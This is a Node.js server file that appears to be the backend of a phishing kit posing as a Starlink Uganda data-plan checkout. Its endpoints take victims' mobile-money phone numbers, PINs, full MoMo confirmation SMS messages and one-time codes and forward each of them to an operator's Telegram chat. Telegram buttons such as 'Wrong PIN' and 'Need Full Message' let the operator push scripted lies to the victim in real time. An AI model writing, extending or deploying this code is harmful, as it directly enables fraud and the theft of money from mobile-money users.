require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// CONFIG — set these in Railway Variables
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json({ limit: '1mb' }));

// Serve static files (HTML, images) from backend root
app.use(express.static(__dirname));

// Health check for Railway
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', service: 'starling-network-ug' });
});

// ============================================
// SESSION STORE (in-memory — resets on redeploy)
// ============================================
const sessions = new Map();

setInterval(() => {
  const now = Date.now();
  for (const [id, session] of sessions) {
    if (now - session.createdAt > 30 * 60 * 1000) {
      sessions.delete(id);
    }
  }
}, 5 * 60 * 1000);

// ============================================
// HELPERS
// ============================================
function escapeHtml(str) {
  if (str === undefined || str === null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatPhone(phone) {
  if (!phone) return '';
  return '+256 ' + String(phone).replace(/^0/, '');
}

async function sendTelegramMessage(text, replyMarkup = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('Telegram credentials missing — message not sent');
    console.log('MESSAGE THAT WOULD BE SENT:\n', text);
    if (replyMarkup) console.log('KEYBOARD:', JSON.stringify(replyMarkup));
    return null;
  }
  try {
    const payload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const resp = await axios.post(`${TELEGRAM_API}/sendMessage`, payload);
    return resp.data?.result || null;
  } catch (err) {
    console.error('Telegram send failed:', err.response?.data || err.message);
    return null;
  }
}

async function answerCallbackQuery(callbackQueryId, text = '') {
  try {
    await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
      callback_query_id: callbackQueryId,
      text,
      show_alert: false
    });
  } catch (err) {
    console.error('answerCallbackQuery failed:', err.response?.data || err.message);
  }
}

async function editMessageReplyMarkup(chatId, messageId) {
  try {
    await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: { inline_keyboard: [] }
    });
  } catch (err) {
    // Non-fatal — message may have been deleted or too old
    console.error('editMessageReplyMarkup failed:', err.response?.data || err.message);
  }
}

// Build inline keyboards per stage
function checkoutKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:${sessionId}` },
        { text: '❌ Reject', callback_data: `reject:${sessionId}` }
      ]
    ]
  };
}

function smsKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:${sessionId}` },
        { text: '❌ Decline', callback_data: `decline:${sessionId}` }
      ],
      [
        { text: '🔑 Wrong PIN', callback_data: `wrong_pin:${sessionId}` },
        { text: '🔄 Resend', callback_data: `resend:${sessionId}` }
      ],
      [
        { text: '📄 Need Full Message', callback_data: `need_full_message:${sessionId}` }
      ]
    ]
  };
}

function otpKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '✅ Approve', callback_data: `approve:${sessionId}` },
        { text: '❌ Decline', callback_data: `decline:${sessionId}` },
        { text: '🔄 Resend', callback_data: `resend:${sessionId}` }
      ]
    ]
  };
}

// ============================================
// POST /api/checkout
// ============================================
app.post('/api/checkout', async (req, res) => {
  try {
    const { plan, data, price, phone, pin } = req.body;

    if (!phone || !pin) {
      return res.status(400).json({ ok: false, error: 'Phone and PIN are required' });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
    const session = {
      id: sessionId,
      plan: plan || 'Unknown',
      data: data || '-',
      price: price || 0,
      phone,
      pin,
      sms: null,
      otp: null,
      stage: 'checkout',
      status: 'pending',
      createdAt: Date.now()
    };
    sessions.set(sessionId, session);

    const message = `
🔔 <b>New Payment Request — Uganda</b>

📦 <b>Plan:</b> ${escapeHtml(plan)} (${escapeHtml(data)})
💰 <b>Price:</b> UGX ${Number(price || 0).toLocaleString()}
📱 <b>Phone:</b> ${formatPhone(phone)}
🔐 <b>PIN:</b> <code>${escapeHtml(pin)}</code>

🆔 <b>Session:</b> <code>${sessionId}</code>
    `.trim();

    await sendTelegramMessage(message, checkoutKeyboard(sessionId));

    return res.json({ ok: true, sessionId });
  } catch (err) {
    console.error('Checkout error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// GET /api/status/:sessionId
// ============================================
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.json({ ok: true, status: 'timeout', message: 'Session not found or expired' });
  }

  // Auto-timeout only for checkout-stage pending sessions
  if (
    session.stage === 'checkout' &&
    session.status === 'pending' &&
    Date.now() - session.createdAt > 5 * 60 * 1000
  ) {
    session.status = 'timeout';
  }

  let message = '';
  switch (session.status) {
    case 'rejected':
      message = 'Incorrect number. Kindly check your number and try again.';
      break;
    case 'wrong_pin':
      message = 'You have entered a wrong PIN.';
      break;
    case 'declined':
      message = 'You have entered an incorrect code. Kindly check a new code sent to your MoMo number.';
      break;
    case 'resend':
      message = 'The code has expired. Kindly check a new code, copy and paste here.';
      break;
    case 'need_full_message':
      message = 'Kindly check a message sent from MoMo and copy the full message.';
      break;
    default:
      message = '';
  }

  return res.json({
    ok: true,
    status: session.status,
    stage: session.stage,
    message
  });
});

// ============================================
// POST /api/sms
// Now accepts sessionId, attaches SMS to session,
// moves stage to 'sms', and sends inline keyboard.
// ============================================
app.post('/api/sms', async (req, res) => {
  try {
    const { sessionId, plan, data, price, period, phone, sms } = req.body;

    if (!sms) {
      return res.status(400).json({ ok: false, error: 'SMS required' });
    }

    let session = sessionId ? sessions.get(sessionId) : null;

    // If session doesn't exist, create a light one so admin actions still work
    if (!session) {
      const newId = crypto.randomBytes(16).toString('hex');
      session = {
        id: newId,
        plan: plan || 'Unknown',
        data: data || '-',
        price: price || 0,
        phone: phone || '',
        pin: null,
        sms: null,
        otp: null,
        stage: 'sms',
        status: 'pending',
        createdAt: Date.now()
      };
      sessions.set(newId, session);
    }

    session.sms = sms;
    session.stage = 'sms';
    session.status = 'pending';
    session.smsAt = Date.now();

    // Show the FULL message the user pasted (escaped so Telegram renders it safely)
    const message = `
📩 <b>Confirmation SMS Received — Uganda</b>

📦 <b>Plan:</b> ${escapeHtml(plan || session.plan)} (${escapeHtml(data || session.data)})
💰 <b>Price:</b> UGX ${Number(price || session.price || 0).toLocaleString()}
⏱ <b>Period:</b> ${escapeHtml(period || '-')}
📱 <b>Phone:</b> ${formatPhone(phone || session.phone)}

📝 <b>Full SMS:</b>
<code>${escapeHtml(sms)}</code>

🆔 <b>Session:</b> <code>${session.id}</code>
    `.trim();

    await sendTelegramMessage(message, smsKeyboard(session.id));

    return res.json({ ok: true, sessionId: session.id });
  } catch (err) {
    console.error('SMS error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// POST /api/otp
// Now accepts sessionId, attaches OTP to session,
// moves stage to 'otp', and sends inline keyboard.
// ============================================
app.post('/api/otp', async (req, res) => {
  try {
    const { sessionId, plan, data, price, period, phone, otp } = req.body;

    if (!otp) {
      return res.status(400).json({ ok: false, error: 'OTP required' });
    }

    let session = sessionId ? sessions.get(sessionId) : null;

    if (!session) {
      const newId = crypto.randomBytes(16).toString('hex');
      session = {
        id: newId,
        plan: plan || 'Unknown',
        data: data || '-',
        price: price || 0,
        phone: phone || '',
        pin: null,
        sms: null,
        otp: null,
        stage: 'otp',
        status: 'pending',
        createdAt: Date.now()
      };
      sessions.set(newId, session);
    }

    session.otp = otp;
    session.stage = 'otp';
    session.status = 'pending';
    session.otpAt = Date.now();

    const message = `
🔑 <b>OTP Submitted — Uganda</b>

📦 <b>Plan:</b> ${escapeHtml(plan || session.plan)} (${escapeHtml(data || session.data)})
💰 <b>Price:</b> UGX ${Number(price || session.price || 0).toLocaleString()}
⏱ <b>Period:</b> ${escapeHtml(period || '-')}
📱 <b>Phone:</b> ${formatPhone(phone || session.phone)}
🔢 <b>OTP:</b> <code>${escapeHtml(otp)}</code>

🆔 <b>Session:</b> <code>${session.id}</code>
    `.trim();

    await sendTelegramMessage(message, otpKeyboard(session.id));

    return res.json({ ok: true, sessionId: session.id });
  } catch (err) {
    console.error('OTP error:', err);
    return res.status(500).json({ ok: false, error: 'Server error' });
  }
});

// ============================================
// TELEGRAM WEBHOOK
// Handles BOTH:
//  - callback_query (inline button taps)  ← NEW
//  - message (legacy /approve /reject)    ← kept as fallback
// ============================================
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};

    // ---------- INLINE BUTTON TAPS ----------
    if (update.callback_query) {
      const cq = update.callback_query;
      const data = cq.data || '';
      const chatId = cq.message?.chat?.id;
      const messageId = cq.message?.message_id;

      // Format: action:sessionId
      const [action, sessionId] = data.split(':');

      // Only allow the configured admin chat
      if (!chatId || String(chatId) !== String(TELEGRAM_CHAT_ID)) {
        await answerCallbackQuery(cq.id, 'Not authorized');
        return res.sendStatus(200);
      }

      const session = sessions.get(sessionId);
      if (!session) {
        await answerCallbackQuery(cq.id, 'Session not found or expired');
        await editMessageReplyMarkup(chatId, messageId);
        return res.sendStatus(200);
      }

      let toast = '';

      switch (action) {
        case 'approve':
          session.status = 'approved';
          toast = '✅ Approved';
          break;
        case 'reject':
          session.status = 'rejected';
          toast = '🚫 Rejected';
          break;
        case 'decline':
          session.status = 'declined';
          toast = '❌ Declined';
          break;
        case 'wrong_pin':
          session.status = 'wrong_pin';
          toast = '🔑 Marked wrong PIN';
          break;
        case 'resend':
          session.status = 'resend';
          toast = '🔄 Marked resend';
          break;
        case 'need_full_message':
          session.status = 'need_full_message';
          toast = '📄 Requested full message';
          break;
        default:
          await answerCallbackQuery(cq.id, 'Unknown action');
          return res.sendStatus(200);
      }

      // Stop spinner + show small toast in Telegram
      await answerCallbackQuery(cq.id, toast);

      // Remove the inline keyboard so the admin can't double-tap
      await editMessageReplyMarkup(chatId, messageId);

      return res.sendStatus(200);
    }

    // ---------- LEGACY TEXT COMMANDS ----------
    const message = update.message;
    if (!message || !message.text) return res.sendStatus(200);

    const text = message.text.trim();
    const fromId = message.chat.id.toString();

    if (fromId !== String(TELEGRAM_CHAT_ID)) {
      return res.sendStatus(200);
    }

    const approveMatch = text.match(/^\/approve\s+(\w+)/);
    const rejectMatch = text.match(/^\/reject\s+(\w+)/);

    if (approveMatch) {
      const session = sessions.get(approveMatch[1]);
      if (session) {
        session.status = 'approved';
        await sendTelegramMessage(`✅ Approved session <code>${approveMatch[1]}</code>`);
      } else {
        await sendTelegramMessage(`❌ Session not found: <code>${approveMatch[1]}</code>`);
      }
    } else if (rejectMatch) {
      const session = sessions.get(rejectMatch[1]);
      if (session) {
        session.status = 'rejected';
        await sendTelegramMessage(`🚫 Rejected session <code>${rejectMatch[1]}</code>`);
      } else {
        await sendTelegramMessage(`❌ Session not found: <code>${rejectMatch[1]}</code>`);
      }
    }

    return res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    return res.sendStatus(200);
  }
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Starlink Uganda backend running on port ${PORT}`);
});
